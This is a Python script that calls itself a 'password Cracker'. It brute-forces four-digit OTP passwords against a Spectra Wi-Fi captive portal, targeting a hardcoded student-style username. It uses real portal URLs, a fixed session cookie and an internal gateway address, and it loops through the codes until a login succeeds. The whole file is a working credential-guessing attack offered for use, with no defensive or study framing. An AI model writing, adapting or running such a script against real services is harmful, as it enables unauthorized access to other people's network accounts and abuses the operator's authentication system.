import requests

# Define the base URL and username
base_url = 'http://10.201.21.1'
username = "23TSFBA023"

def logged_in(password_str=-1):
    status_response = requests.get(base_url, allow_redirects=False)

    if status_response.status_code == 302:
        redirect_url = status_response.headers['Location']
        if redirect_url==base_url+"/status":
            return True  # Exit the loop if login and status check are successful
        elif redirect_url==base_url+"/login":
            # print()
            if password_str!=-1:
                print("not connected, checked:", password_str)
            return False
        else:
            final_response = requests.get(redirect_url)
            print("something is wrong!")
            print(redirect_url)
            print(final_response.headers)
            return None


# Loop over the range of passwords
print("Welcome to the password Cracker!\n\n")

# check if user is logged in, if user is logged in prompt to log out.
if logged_in(): 
    print("you are logged in!")
    usr_input = input("Do you want to logout and run the script? type y for yes and n for no:\n")
    if usr_input.lower()=="y" or usr_input.lower()=="yes":
        logout = requests.get('http://10.201.21.1/logout?')
        if not logged_in():
            print("you are logged out, running the script now!\n\n")
        else:
            print("error logging out.")
            exit
    else:
        exit


print(f"finding password for {username}\n\n")

for password in range(1978, 10000):
    # First POST request
    otp_url = 'http://wifiunify38.spectra.co/userportal/pages/usermedia/spectra3/stanza-disable-random-mac/otp.jsp'
    otp_data = {
        'memberId': username
    }
    otp_cookies = {
        'JSESSIONID': 'A7A0859DC5ED1606979E3C1BDB502A78'
    }
    otp_response = requests.post(otp_url, data=otp_data, cookies=otp_cookies)

    # Second POST request
    login_url = 'http://wifiunify38.spectra.co/userportal/newlogin.do'
    login_data = {
        'username': 'STN-'+username,
        'password': password,
        'type': '2',
        'phone': '0',
        'jsonresponse': '1'
    }
    login_cookies = {
        'JSESSIONID': 'A7A0859DC5ED1606979E3C1BDB502A78'
    }
    login_response = requests.post(login_url, data=login_data, cookies=login_cookies)

    # Third POST request
    magic_url = 'http://10.201.21.1/login'
    magic_data = {
        'username': 'STN-'+username,
        'password': password,
        'magic': ''
    }
    magic_response = requests.post(magic_url, data=magic_data)

    # Convert the password to a 4-digit string
    password_str = f'{password:04}'
    
    # Define the data for the request
    magic_data = {
        'username': username,
        'password': password_str,
        'magic': ''
    }

    if logged_in(password_str):
        print(f"Login successful for username: {username}, password: {password_str}")
        break




